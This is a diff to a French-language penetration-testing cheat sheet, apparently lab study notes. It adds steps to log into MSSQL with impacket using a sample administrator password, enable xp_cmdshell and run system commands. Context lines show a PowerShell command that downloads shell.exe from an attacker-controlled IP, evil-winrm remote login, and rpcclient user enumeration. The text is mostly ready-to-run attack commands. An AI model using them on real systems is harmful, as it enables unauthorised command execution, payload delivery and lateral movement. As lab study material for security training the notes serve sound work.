@@ -18,6 +18,14 @@ Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe'
 ## Connexion a Windows Management (port 5985 par défaut) :
 •	evil-winrm -i [IP] -u [USER]  
 
+## Executer des commandes via MSQL :
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+
 ## Utilisation du service RPC :
 **Connexion au serveur:** rpcclient -U "[USER]" [IP]  
 **Lister les users:** enumdomusers  
